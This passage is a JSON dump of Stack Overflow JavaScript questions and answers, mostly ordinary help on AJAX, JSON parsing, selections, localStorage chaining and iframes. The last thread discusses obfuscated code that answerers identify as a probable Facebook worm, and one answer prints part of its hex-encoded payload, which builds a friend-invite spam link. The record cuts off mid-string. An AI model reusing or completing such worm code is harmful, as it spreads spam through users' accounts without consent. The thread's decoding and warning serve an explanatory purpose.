            "body": "<p>I am using an XMLHttpRequest to fetch an image from a server (run locally from a third party server-applet)</p>\n\n<p>A <strong>simplified</strong> version of the code is shown below.</p>\n\n<p>The image is returned as a JPEG and the returned header shows \"content-type= image/jpg\".  I can view the information via Firebug for Firefox.  </p>\n\n<p>However I am having a terrible time being able to show the actual image on a webpage because it is the image data being returned from the server NOT a uri to the image location.</p>\n\n<p>What is the proper way to display this image from the returned data?  Should I be using a <code>&lt;span&gt;</code> tag or an <code>&lt;img&gt;</code> tag or a <code>&lt;magical-show-image-from-data&gt;</code> tag?</p>\n\n<pre><code>function getXML(url, postData, requestStateChangeHandler){        \n    if(window.XMLHttpRequest)\n    {// code for IE7+, Firefox, Chrome, Opera, Safari\n        xmlhttp=new XMLHttpRequest();\n    }\n    else\n    {//Code for IE6, IE5\n        xmlhttp=new ActiveXObject(\"Microsoft.XMLHTTP\");\n    }\n    xmlhttp.onreadystatechange = requestStateChangeHandler;\n\n    xmlhttp.open(\"POST\", url, true);\n    xmlhttp.setRequestHeader('Content-Type', 'text/xml');\n    xmlhttp.setRequestHeader('Cache-Control', 'no-cache');\n    xmlhttp.send(postData);\n}\n\n\nfunction requestStateChangeHandler(){\n    if (xmlhttp.readyState == 4) \n    {\n        if(xmlhttp.status == 200)\n        {\n            document.getElementById('results').innerHTML = xmlhttp.responseText;\n        }\n        else\n            dump(\"Error loading page\\n\");\n    }\n}\n</code></pre>\n",
            "last_activity_date": 1284593929,
            "question_id": 3721764,
            "score": 4,
            "tags": [
                "javascript",
                "html",
                "xml",
                "image",
                "dom"
            ],
            "title": "Handling images from XMLHttpRequest (with HTML and Javascript)"
        },
        {
            "answer_count": 6,
            "answers": [
                {
                    "body": "<p>Use the <code>JSON.parse</code> function to convert a JSON string into a JS object. Most modern browsers include <code>JSON.parse</code>, but it is also included in <a href=\"https://github.com/douglascrockford/JSON-js/blob/master/json2.js\">json2.js</a> if you need a fallback for older browsers.</p>\n",
                    "is_accepted": false,
                    "score": 5
                },
                {
                    "body": "<p>Since you're using jQuery, take a look at <a href=\"http://api.jquery.com/jQuery.getJSON/\" rel=\"nofollow\"><strong><code>.getJSON()</code></strong></a></p>\n\n<p>The way you use <code>.getJSON()</code> is:</p>\n\n<pre><code>jQuery.getJSON( url, [ data ], [ callback(data, textStatus) ] )\n</code></pre>\n\n<p><code>url</code> is of course the <code>url</code> you're getting the data from. <code>[ data ]</code> is the stuff you send <strong>to</strong> the server. <code>[ callback(data, textStatus) ]</code> is a function that handles the <code>data</code> coming back <strong>from</strong> the server. You can generally leave out the second argument <code>textStatus</code>. The data coming back is understood to be JSON. <code>.getJSON()</code> is shorthand for a <code>.ajax()</code> call that specifies JSON data.</p>\n\n<p>So in your case this would be something like (note that I changed the JSON coming back from the server to <code>response</code>... it's a less confusing nomenclature in your case than using <code>data</code>, since you have a <code>data</code> property in your JSON):</p>\n\n<pre><code>$.getJSON(base_url+'/ajax/get_itema/'+item_id+'/0/3/true', function(response) {\n    ...\n});\n</code></pre>\n\n<p>So, to recover things from <code>response</code> we simply access them using dot and square bracket notation. To get the first set of <code>data</code>:</p>\n\n<pre><code>response.data[0].title \\\\ &lt;== \"Yeah Lets Go!\"\nresponse.data[0].path \\\\ &lt;== \"http://domain.com/yeah\"\n</code></pre>\n\n<p>The above looks in <code>response</code> which is our JSON object. Then it looks at the first <code>data</code> elment (there are 3) and pick the <code>title</code> in the first line and the <code>path</code> in the second.</p>\n\n<p>Since you're using jQuery you can use <strong><a href=\"http://api.jquery.com/jQuery.each/\" rel=\"nofollow\"><code>.each()</code></a></strong> to iterate over your 3 <code>data</code>. Like this:</p>\n\n<pre><code>$.each(response.data, function(index, value) {\n    $(\"body\").append('&lt;a href=\"' + value.path + '\"&gt;' + value.title + '&lt;/a&gt;');\n    $(\"body\").append('&lt;p class=\"date\"&gt;Created: ' + value.created_formated + \n      '&lt;/p&gt;&lt;br /&gt;');\n});\n</code></pre>\n\n<h2><strong><a href=\"http://jsfiddle.net/x9WsY/\" rel=\"nofollow\">jsFiddle example</a></strong></h2>\n\n<p><code>.each()</code> sanely loops over a collection of items. The first argument of <code>.each()</code>, is the object you want to loop over. This is <code>response.data</code> not merely <code>response</code>. This is because we want to look at <code>response.data[0]</code>, <code>response.data[1]</code>, and <code>response.data[2]</code>. The second argument of <code>.each()</code> is the callback function, or what we want to do with each of the items we are iterating over. Within the callback function, the first argument is automatically the index of the item (0, 1, or 2 in your case). The second argument is the value of the item. In your case this is a separate object: <code>response.data[0]</code>, <code>response.data[1]</code>, and <code>response.data[2]</code> respectively. We can use dot notation to retrieve the things we want directly from these objects. In the above example we access <code>.path</code>. <code>.title</code> and <code>.created_formated</code> from each of the <code>value</code>s.</p>\n\n<p>This make your entire function:</p>\n\n<pre><code>$.getJSON(base_url+'/ajax/get_itema/'+item_id+'/0/3/true', function(response) {\n    $.each(response.data, function(index, value) {\n        $(\"body\").append('&lt;a href=\"' + value.path + '\"&gt;' + value.title + '&lt;/a&gt;');\n        $(\"body\").append('&lt;p class=\"date\"&gt;Created: ' + value.created_formated + \n          '&lt;/p&gt;&lt;br /&gt;');\n    });                \n});\n</code></pre>\n\n<p>Of course you probably want to append the response to (a) specific element/s.</p>\n\n<p><strong><a href=\"http://stackoverflow.com/questions/699024/multidimensional-arrays-and-jquerys-getjson/699046#699046\">Here's some good info</a></strong> on using <code>.getJSON()</code> to access multidimensional JSON data from another SO question.</p>\n\n<p><strong><a href=\"http://www.json.org/js.html\" rel=\"nofollow\">Here's some general info about JSON in Javascript</a></strong>.</p>\n\n<hr>\n\n<p><strong>Note:</strong></p>\n\n<p>You need commas between your curly braces!</p>\n\n<p>You have:</p>\n\n<pre><code>...p:\\/\\/domain.com\\/yeah\"}{\"id\":\"4242\",\"title\"...\n</code></pre>\n\n<p>You need:</p>\n\n<pre><code>...p:\\/\\/domain.com\\/yeah\"}, {\"id\":\"4242\",\"title\"...\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>Having a div with id <code>result</code> to get the html, something like:</p>\n\n<pre><code>$.getJSON(base_url+'/ajax/get_itema/'+item_id+'/0/3/true', function(data) {\n    $(\"#result\").empty();\n    $.each(data.data, function(i, d) {\n        $(\"#result\").append(\"&lt;a href='\" + d.path + \"'&gt;\" + d.title + \"&lt;/a&gt;\" + \n            \"&lt;p class='date'&gt;Created: \" + d.created_formated + \"&lt;/p&gt;\");\n    }\n});\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>Try a templating engine that convert the JSON to HTML on the browser.</p>\n\n<p>You can have a look at <a href=\"http://beebole.com/pure\" rel=\"nofollow\">pure.js</a>, it is very fast, and keep the HTML totally clean of any Javascript templating logic.\nWe use it to generate all the HTML from JSON data in our web app.(Yep... I'm a main contributor to the lib)</p>\n\n<p>If you are more familiar with the &lt;%...%> or ${...} kind of templates, there are plenty of them and for any taste if you <a href=\"http://www.google.be/#hl=en&amp;q=javascript+template\" rel=\"nofollow\">search on the web for javascript template</a>.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>I don't found in any answers that the data which you posted are <strong>NOT valid JSON string</strong>. Probably it is your main problem and the reason why <code>$.get</code> can not convert the server response to object. The objects inside the data array <strong>must be separated with commas</strong>. So the data must looks like</p>\n\n<pre><code>{\n    \"total\": \"3\",\n    \"data\": [\n        {\n            \"id\": \"4242\",\n            \"title\": \"Yeah Lets Go!\",\n            \"created\": \"1274700584\",\n            \"created_formated\": \"2010-07-24 13:19:24\",\n            \"path\": \"http:\\/\\/domain.com\\/yeah\" \n        },\n        {\n            \"id\": \"4242\",\n            \"title\": \"Yeah Lets Go!222\",\n            \"created\": \"1274700584\",\n            \"created_formated\": \"2010-07-24 13:19:24\",\n            \"path\": \"http:\\/\\/domain.com\\/yeah222\" \n        },\n        {\n            \"id\": \"4242\",\n            \"title\": \"Yeah Lets Go!333\",\n            \"created\": \"1274700584\",\n            \"created_formated\": \"2010-07-24 13:19:24\",\n            \"path\": \"http:\\/\\/domain.com\\/yeah333\" \n        } \n    ]\n}\n</code></pre>\n\n<p>I recommend you allays verify JSON strings in <a href=\"http://www.jsonlint.com/\" rel=\"nofollow\">http://www.jsonlint.com/</a>.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>using data from Oleg answer</p>\n\n<pre><code>var json = {} // your json data reformated by Oleg\n\nfor (var i = 0; i &lt; json.data.length; i++) {\n    document.write('&lt;a href=\"' + json.data[i].path.replace(/\\\\/g, '') + '\"&gt;' + json.data[i].title + '&lt;/a&gt;');\n    document.write('&lt;br&gt;');\n    document.write('&lt;p class=\"date\"&gt;Created: ' + json.data[i].created_formated +'&lt;/p&gt;');\n    document.write('&lt;br&gt;');\n}\n</code></pre>\n\n<p>remember that the \"data\" is an array of object</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I have this kind of json string:</p>\n\n<pre><code>{\"total\":\"3\",\"data\":[{\"id\":\"4242\",\"title\":\"Yeah Lets Go!\",\"created\":\"1274700584\",\"created_formated\":\"2010-07-24 13:19:24\",\"path\":\"http:\\/\\/domain.com\\/yeah\"}{\"id\":\"4242\",\"title\":\"Yeah Lets Go!222\",\"created\":\"1274700584\",\"created_formated\":\"2010-07-24 13:19:24\",\"path\":\"http:\\/\\/domain.com\\/yeah222\"}{\"id\":\"4242\",\"title\":\"Yeah Lets Go!333\",\"created\":\"1274700584\",\"created_formated\":\"2010-07-24 13:19:24\",\"path\":\"http:\\/\\/domain.com\\/yeah333\"}]}\n</code></pre>\n\n<p>I would need to parse it to javascript object i believe? And then into html like:</p>\n\n<pre><code>&lt;a href=\"http:www..domain.com/yeah\"&gt;Yeah Lets Go!&lt;/a&gt;\n&lt;p class=\"date\"&gt;Created: 2010-07-24 13:19:24\"&lt;/p&gt;\n</code></pre>\n\n<p>but I have no clue how to parse it and so on. </p>\n\n<p>I get that string from this:</p>\n\n<pre><code>$('a.link').click(function() {\nvar item_id = $(this).attr(\"href\").split('#')[1];\n$.get(base_url+'/ajax/get_itema/'+item_id+'/0/3/true', null, function(data, status, xhr) {\n$('#contentCell').html(data);\n});\n</code></pre>\n",
            "last_activity_date": 1283835547,
            "question_id": 3653844,
            "score": 4,
            "tags": [
                "javascript",
                "ajax",
                "json"
            ],
            "title": "How to parse json string to javascript object"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>If the selection is within an editable element or document, this is simple:</p>\n\n<pre><code>function selectionIsBold() {\n    var isBold = false;\n    if (document.queryCommandState) {\n        isBold = document.queryCommandState(\"bold\");\n    }\n    return isBold;\n}\n</code></pre>\n\n<p>Otherwise, it's a little trickier: in non-IE browsers, you'll have to temporarily make the document editable:</p>\n\n<pre><code>function selectionIsBold() {\n    var range, isBold = false;\n    if (window.getSelection) {\n        var sel = window.getSelection();\n        if (sel &amp;&amp; sel.getRangeAt &amp;&amp; sel.rangeCount) {\n            range = sel.getRangeAt(0);\n            document.designMode = \"on\";\n            sel.removeAllRanges();\n            sel.addRange(range);\n        }\n    }\n    if (document.queryCommandState) {\n        isBold = document.queryCommandState(\"bold\");\n    }\n    if (document.designMode == \"on\") {\n        document.designMode = \"off\";\n    }\n    return isBold;\n}\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 11
                }
            ],
            "body": "<p>I am trying to identify whether a selected text (in Firefox) is bold or not? For e.g.:</p>\n\n<pre><code>&lt;p&gt;Some &lt;b&gt;text is typed&lt;/b&gt; here&lt;/p&gt;\n\n&lt;p&gt;Some &lt;span style=\"font-weight: bold\"&gt;more text is typed&lt;/span&gt; here&lt;/p&gt;\n</code></pre>\n\n<p>The user can either select a part of bold text, or the full bold text. Here is what I am trying to do:</p>\n\n<pre><code>function isSelectedBold(){\n    var r = window.getSelection().getRangeAt(0);\n    // then what?\n}\n</code></pre>\n\n<p>Could you please help me?</p>\n\n<p>Thanks<br>\nSrikanth</p>\n",
            "last_activity_date": 1280921663,
            "question_id": 3404618,
            "score": 4,
            "tags": [
                "javascript",
                "format",
                "range",
                "selection",
                "bold"
            ],
            "title": "Identify whether the selected text in a web page is bold nor not"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>This is impossible.</p>\n\n<p>If <code>getItem('names')</code> returns <code>Bill</code>, you can't call <code>addItem</code> on it.<br>\nIt would be possible to add <code>addItem</code> and <code>getItem</code> methods to every item in the storage, but it would be a <em>horrible</em> idea.</p>\n",
                    "is_accepted": false,
                    "score": 5
                },
                {
                    "body": "<p><strong>This is possible</strong> if you <strong>create a wrapper/decorator object</strong> that makes chaining possible. This is how jQuery works for example. But it is <strong>useless in this case</strong>. </p>\n\n<p>I made a possible implementation, though.</p>\n\n<p>But <em>getItem</em> will break the chain (so it should always be used at the end).</p>\n\n<pre><code>storage().setItem('names', 'Bill').getItem('names'); // or\nstorage().setItem('names').addItem('Bill').getItem('names'); // or\nstorage().key('names').value('Bill').set().get('names');\n</code></pre>\n\n<p><strong>Implementation</strong></p>\n\n<pre><code>(function( window, undefined ) {\n\nvar storage = function( key, value ) {\n  return new storage.init( key, value );\n};\n\nstorage.init = function( key, value ) {\n  this._key   = key;\n  this._value = value;\n};\n\nstorage.init.prototype = {\n\n  key: function( key ) {\n    this._key = key;\n    return this;\n  },\n\n  value: function( value ) {\n    this._value = value;\n    return this;\n  },\n\n  get: function( key ) {\n    key = isset(key) || this._key;\n    return localStorage.getItem( key );\n  },\n\n  set: function( key, value ) {\n    this._key   = key   = isset(key)   || this._key;\n    this._value = value = isset(value) || this._value;\n    if ( key &amp;&amp; value ) {\n      localStorage.setItem( key, value );\n    }\n    return this;\n  },\n\n  addItem: function( value ) {\n    this._value = isset(value) || this._value;\n    if ( this._key &amp;&amp; value !== undefined ) {\n      localStorage.setItem( this._key, value );\n    }\n    return this;\n  },\n\n  // aliases...\n  getItem: function( key ) {\n    return this.get( key );\n  },\n  setItem: function( key, value  ) {\n    return this.set( key, value );\n  }\n};\n\nfunction isset( value ) {\n  return value !== undefined ? value : false;\n}\n\nwindow.storage = storage;\n\n})( window );\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 5
                },
                {
                    "body": "<p>The simplest thing would be to not do this at all :)</p>\n\n<p>If that doesn't work, then there are solutions like modifying the native <code>getItem</code> function but that's a really bad idea. The best way would be to write a wrapper around <code>localStorage</code>, much like what jQuery does to DOM nodes, and use that wrapper to get and put items in local storage. The wrapper could have an interface like:</p>\n\n<pre><code>ApplicationStorage\n    getItem()\n    setItem()\n    key()\n    removeItem()\n</code></pre>\n\n<p>Then define acceptable type wrappers like <code>Array</code> within <code>ApplicationStorage</code> that have methods like <code>addItem</code></p>\n\n<pre><code>ApplicationStorage.Array\n    addItem()\n</code></pre>\n\n<p>When <code>applicationStorage.getItem(\"names\")</code> is called, return an object of <code>ApplicationStorage.Array</code> that contains the method <code>addItem</code> which will make chaining possible.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<pre><code>getItem('names').addItem('Bill').getItem('names')\n</code></pre>\n\n<p>I am confused, how do you get an item that has not been added???</p>\n\n<p>getItem returns an object contains addItem method, and addItem method returns an object contains getItem method</p>\n\n<p>Anyway, have a look the following tutorial.  It does not completely solve your problem, but will give you an idea. </p>\n\n<p><a href=\"http://guanfenglin.spaces.live.com/blog/cns!4E0822BF6C959B7F!668.entry\" rel=\"nofollow\">http://guanfenglin.spaces.live.com/blog/cns!4E0822BF6C959B7F!668.entry</a></p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I want to make a function that add an item to my localStorage object. E.g.:</p>\n\n<pre><code>alert(localStorage.getItem('names').addItem('Bill').getItem('names'));\n</code></pre>\n\n<p>The first method is getItem which gets the item for localStorage objects... but addItem would be a custom function. This chain of functions would finally alert Bill.</p>\n\n<p>So, how would I make this function chain to localStorage?</p>\n",
            "last_activity_date": 1362456748,
            "question_id": 3176411,
            "score": 4,
            "tags": [
                "javascript",
                "html5",
                "chaining",
                "local-storage"
            ],
            "title": "Chaining a function in JavaScript?"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>I recently got the same problem when I tried to inject <a href=\"http://connect.facebook.net/en_US/all.js\">http://connect.facebook.net/en_US/all.js</a> into Google Reader ( for this exciting Kynetx coding contest : <a href=\"http://code.kynetx.com/2011/04/26/250-to-build-kynetx-facebook-send-within-24hrs-ends-apr-27th/\">http://code.kynetx.com/2011/04/26/250-to-build-kynetx-facebook-send-within-24hrs-ends-apr-27th/</a> ) . all.js starts with \"if (!window.FB) window.FB = { ...\" and declares the 'provide' method . In google reader the FB object was already present (dont know why or how it was created) so the code inside the if never got executed. The trick I used was to set FB to null before including \"http://http://connect.facebook.net/en_US/all.js\" . Google Reader didn't complain. It might be a solution in your situation too. \nUpdate: you may need to set FB to null this way:</p>\n\n<pre><code>var head = $(\"head\").get(0);  // using jquery\nvar script2 = document.createElement(\"script\");\nscript2.innerHTML = \"window.FB = null;FB=null;\";\nhead.appendChild(script2);\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 7
                },
                {
                    "body": "<p>Although, the code provided by Loic Devaux will do the trick it is not needed in your case. He is solving an issue with markup shown on a third party website...</p>\n\n<p>I had the same problem and initially added this code to solve it. Then I thought that there must be something wrong and I wasn't doing the things right. I added facebook comment box to a page that already had a facebook share button. So I just moved the share script after the initialization script and the error disappeared.</p>\n\n<p>My advice is to check whether you have more than one FB widget on your page(s). If so read the documentation and make sure you've added the correct scripts on the correct place.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>Loic's solution does not work in IE. Instead you have to do this:</p>\n\n<pre><code>var head = $(\"head\").get(0);  // using jquery\nvar script2 = document.createElement(\"script\");\nif (!$.browser.msie ) {\n    script2.innerHTML = \"window.FB = null;FB=null;\";\n}else{\n    script2.text = \"window.FB = null;FB=null;\";\n}\nhead.appendChild(script2);\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>I have recently added the facebook like button, but the following code returns an error in chrome: Uncaught TypeError: Object # has no method 'provide'</p>\n\n<pre><code>&lt;!-- Facebook --&gt;\n&lt;div id=\"fb-root\"&gt;&lt;/div&gt;\n&lt;script&gt;\n  window.fbAsyncInit = function() {\n    FB.init({appId: '121814204514513', status: true, cookie: true,\n             xfbml: true});\n  };\n  (function() {\n    var e = document.createElement('script'); e.async = true;\n    e.src = document.location.protocol +\n      '//connect.facebook.net/en_US/all.js';\n    document.getElementById('fb-root').appendChild(e);\n  }());\n&lt;/script&gt;\n&lt;!-- Facebook --&gt;\n</code></pre>\n\n<p>The like button works but the error is anoying, does anyone know how to solve that? </p>\n\n<p>Thanks</p>\n",
            "last_activity_date": 1330003626,
            "question_id": 3110991,
            "score": 4,
            "tags": [
                "javascript",
                "facebook"
            ],
            "title": "Facebook like : Uncaught TypeError: Object #&lt;an Object&gt; has no method &#39;provide&#39;"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>You have a syntax error. It should be:</p>\n\n<pre><code>$('#list').click();\n</code></pre>\n\n<p>You forgot the <code>#</code></p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>I've come across the same problem, wanted to implement keyboard navigation in my app, but select elements were not expanded, so people using the keyboard were going to lose functionality. I've created ExpandSelect() function which emulates mouse clicks on select elements, it does so by creating another <code>&lt;select&gt;</code> with multiple options visible at once by setting the <code>size</code> attribute, the code is hosted on Google Code website, ExpandSelect.js is only 4 KB, see screenshots and download it here:</p>\n\n<p><a href=\"http://code.google.com/p/expandselect/\" rel=\"nofollow\">http://code.google.com/p/expandselect/</a></p>\n\n<h1>Screenshots</h1>\n\n<p>There is a little difference in GUI when emulating click, but it does not really matter, see it for yourself:</p>\n\n<p><strong>When mouse clicking:</strong></p>\n\n<p><img src=\"http://expandselect.googlecode.com/hg/mouseclick_manyoptions.jpg\" alt=\"MouseClicking\"></p>\n\n<p><strong>When emulating click:</strong></p>\n\n<p><img src=\"http://expandselect.googlecode.com/hg/emulateclick_manyoptions.jpg\" alt=\"EmulatingClicking\"></p>\n\n<p>More screenshots on project's website, link above.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>Please try this:</p>\n\n<pre><code>function showlist() {\n    //using prototype not jQuery\n    $('#list').show();  // shows the select list\n    $('#list').focus(); // sets focus so that when you click away it calles onblur()\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Here a simple solution, AUTO-EXPANDED select menu (all options visible)</p>\n\n<pre><code>&lt;select name=\"ddlTestSelect\" id=\"ddlTestSelect\" style=\"width:200px;position:absolute;\"&gt;\n  &lt;option selected=\"selected\" value=\"0\"&gt;defaulttt&lt;/option&gt;\n  &lt;option&gt;option 2&lt;/option&gt;\n  &lt;option&gt;option 3&lt;/option&gt;\n  &lt;option&gt;option 4&lt;/option&gt;\n&lt;/select&gt;\n&lt;script type=\"text/javascript\"&gt;\n var slctt=document.getElementById(\"ddlTestSelect\");\n slctt.size=slctt.options.length;if(slctt.options.length&gt;1)slctt.style.width='470px';\n&lt;/script&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I have a (hidden) html select object in my menu attached to a menu button link, so that clicking the link shows the list so you can pick from it.</p>\n\n<p>When you click the button, it calls some javascript to show the <code>&lt;select&gt;</code>. Clicking away from the <code>&lt;select&gt;</code> hides the list. What I really want is to make the <code>&lt;select&gt;</code> appear fully expanded, as if you had clicked on the \"down\" arrow, but I can't get this working. I've tried lots of different approaches, but can't make any headway. What I'm doing currently is this:</p>\n\n<pre><code>&lt;li&gt;\n    &lt;a href=\"javascript:showlist();\"&gt;&lt;img src=\"/images/icons/add.png\"/&gt;Add favourite&lt;/a&gt;\n    &lt;select id=\"list\" style=\"display:none; onblur=\"javascript:cancellist()\"&gt;\n    &lt;/select&gt;\n&lt;/li&gt;\n\n// in code\nfunction showlist() {\n    //using prototype not jQuery\n    $('list').show();  // shows the select list\n    $('list').focus(); // sets focus so that when you click away it calles onblur()\n}\n</code></pre>\n\n<ul>\n<li>I've tried calling <code>$('list').click()</code>.</li>\n<li>I've tried setting <code>onfocus=\"this.click()\"</code>\nBut in both cases I'm getting </li>\n</ul>\n\n<blockquote>\n  <p>Uncaught TypeError: Object # has no method 'click'</p>\n</blockquote>\n\n<p>which is peculiar as <a href=\"http://www.w3schools.com/jsref/dom_obj_select.asp\" rel=\"nofollow\">link text</a> says that it supports the standard functions.</p>\n\n<p>I've tried setting the <code>.size = .length</code> which works, but doesn't have the same appearance (as when you click to open the element, it floats over the rest of the page.)</p>\n\n<p>Does anyone have any suggestions?</p>\n",
            "last_activity_date": 1394440448,
            "question_id": 2923600,
            "score": 4,
            "tags": [
                "javascript",
                "html",
                "select",
                "expand"
            ],
            "title": "How to automatically expand html select element in javascript"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>if the iframe-content is from the same domain you can access it by using <code>frames.myiframe.getElement...</code></p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>The browser only restricts access to iframe/parent contents for content which is not from the same domain. For requests from the same domain you can access content via <code>window.parent</code> or via <code>myiframe.document.getElementById</code></p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Yes, you can do this if the location of the iframe and parent page are of the same host (same origin policy). </p>\n\n<p>To ensure the browser will let you do this, you can use </p>\n\n<pre><code>document.domain = \"example.com\" \n</code></pre>\n\n<p>on the parent page and in the iframe. (note that subdomain.example.com and example.com are different)</p>\n\n<p><strong>Dom method for doing this (parent page to iframe):</strong></p>\n\n<pre><code>document.getElementById(\"myiframe\").contentWindow.document.getElementById(\"divinframe\").innerHTML = \"I'm on the inside.\";\n</code></pre>\n\n<p><code>document.getElementById(\"myiframe\").contentWindow.someFunctionInsideIframe();</code></p>\n\n<p>contentWindow is the answer and works in most if not all modern browsers, certainly chrome, ie7+ etc.</p>\n\n<p><strong>To go the other way (iframe to parent page):</strong> </p>\n\n<pre><code>top.document.getElementById(\"DivInTopParent\")\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>To add to what has already been said about interacting with iframes loaded from the same domain:</p>\n\n<p>The browser will allow you to interact with iframes (or frames) as long as the page that is trying to do the interaction and the page that you have loaded have the same document.domain.</p>\n\n<p>You can set the document.domain to a suffix of the host that you were loaded from. e.g. if you have a page loaded from blog.fred.com and it wants to interact with some service called jsonservice.fred.com, both pages will have to do </p>\n\n<pre><code>document.domain = 'fred.com';\n</code></pre>\n\n<p>before javascript from one will be able to interact with the other.</p>\n\n<p>Browsers are clever enough not to allow you to set your document.domain to '.com', in case you were wondering...</p>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>Is it possible to read/edit iframe contents(not only properties like src) with scripts that are on page but outside of this frame? I know that is impossible if source is from other site as it would be a big serurity hole, but I only ask whether it works for other content from the same origin.</p>\n",
            "last_activity_date": 1363964258,
            "question_id": 2689984,
            "score": 4,
            "tags": [
                "javascript",
                "iframe"
            ],
            "title": "Javascript and same origin iframes"
        },
        {
            "answer_count": 7,
            "answers": [
                {
                    "body": "<p>It's merely obfuscated. <code>_0x89f8</code> is a normal variable, <code>\"\\x69\\x6E\\x6E\\x65\\x72\\x48\\x54\\x4D\\x4C\"</code> is a normal string (except with all characters written in hexadecimal: <code>\\x69</code> is <code>i</code> and so on; it says <code>\"innerHTML\"</code>).</p>\n",
                    "is_accepted": false,
                    "score": 8
                },
                {
                    "body": "<p>This looks like <a href=\"http://en.wikipedia.org/wiki/Obfuscated_code\" rel=\"nofollow\">obfuscated</a> javascript - whoever put it up doesn't want it to be easily read. Without meaningful variable names, it will be difficult to understand (i.e. what does <code>_0x89f8</code> mean?).</p>\n\n<p>The string parameters are escaped strings - <code>\\x69</code> is the hex for the character <code>i</code> etc...</p>\n\n<p>Enter the following to your browser address bar to see how it looks:</p>\n\n<pre><code>javascript:alert(\"\\x69\\x6E\\x6E\\x65\\x72\\x48\\x54\\x4D\\x4C\");\n</code></pre>\n\n<p>Chances are that the function being called builds up a javascript string from the parameters and then calls <a href=\"http://www.w3schools.com/jsref/jsref_eval.asp\" rel=\"nofollow\"><code>eval</code></a> on them.</p>\n",
                    "is_accepted": false,
                    "score": 5
                },
                {
                    "body": "<p>No this javascript is <strong>not compiled</strong>, the \"strange\" text you see is <strong>encoded text</strong>. For example\n\\x69 equals the letter i  </p>\n\n<p>It's a differant notation for normal letters and other characters (@,/ etc). And used to make text harder to read, or when using strange/unusual characters in strings for example.</p>\n\n<p>The function <strong>escape()</strong> will go from i to \\x69 .As where the function <strong>unescape()</strong> will go from \\x69 back to the letter i.</p>\n\n<p>The above code example is just an array of encoded strings.</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>It is an obfuscated JS code.</p>\n\n<p>If something is a JS source code, it is never compiled, even if it looks unreadable.</p>\n\n<p>There are many JS code obfuscators or minimizers exist.</p>\n\n<p>Can you identify which program generated it?</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>This code appears to be part of a facebook worm.</p>\n\n\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>You'll find these on Facebook a LOT. \nThey're usually not this obfuscated though, and normally deal with friend invitations or something along those lines.\nI hardly ever execute javascript in the address line so I never checked further into any of these.</p>\n\n<p>This means I have no idea if this is malicious... </p>\n\n<p>You can use this <a href=\"http://jsbeautifier.org/\" rel=\"nofollow\">http://jsbeautifier.org/</a> tool to unobfuscate the code auto magically (well, at least partially)...</p>\n\n<pre><code>var _0x4249=[\"\\x69\\x6E\\x6E\\x65\\x72\\x48\\x54\\x4D\\x4C\",\"\\x61\\x70\\x70\\x34\\x39\\x34\\x39\\x37\\x35\\x32\\x38\\x37\\x38\\x5F\\x62\\x6F\\x64\\x79\",\"\\x67\\x65\\x74\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\\x42\\x79\\x49\\x64\",\"\\x3C\\x61\\x20\\x69\\x64\\x3D\\x22\\x73\\x75\\x67\\x67\\x65\\x73\\x74\\x22\\x20\\x68\\x72\\x65\\x66\\x3D\\x22\\x23\\x22\\x20\\x61\\x6A\\x61\\x78\\x69\\x66\\x79\\x3D\\x22\\x2F\\x61\\x6A\\x61\\x78\\x2F\\x73\\x6F\\x63\\x69\\x61\\x6C\\x5F\\x67\\x72\\x61\\x70\\x68\\x2F\\x69\\x6E\\x76\\x69\\x74\\x65\\x5F\\x64\\x69\\x61\\x6C\\x6F\\x67\\x2E\\x70\\x68\\x70\\x3F\\x63\\x6C\\x61\\x73\\x73\\x3D\\x46\\x61\\x6E\\x4D\\x61\\x6E\\x61\\x67\\x65\\x72\\x26\\x61\\x6D\\x70\\x3B\\x6E\\x6F\\x64\\x65\\x5F\\x69\\x64\\x3D\\x31\\x30\\x30\\x37\\x31\\x39\\x36\\x37\\x36\\x36\\x33\\x38\\x35\\x33\\x35\\x22\\x20\\x63\\x6C\\x61\\x73\\x73\\x3D\\x22\\x20\\x70\\x72\\x6F\\x66\\x69\\x6C\\x65\\x5F\\x61\\x63\\x74\\x69\\x6F\\x6E\\x20\\x61\\x63\\x74\\x69\\x6F\\x6E\\x73\\x70\\x72\\x6F\\x5F\\x61\\x22\\x20\\x72\\x65\\x6C\\x3D\\x22\\x64\\x69\\x61\\x6C\\x6F\\x67\\x2D\\x70\\x6F\\x73\\x74\\x22\\x3E\\x53\\x75\\x67\\x67\\x65\\x73\\x74\\x20\\x74\\x6F\\x20\\x46\\x72\\x69\\x65\\x6E\\x64\\x73\\x3C\\x2F\\x61\\x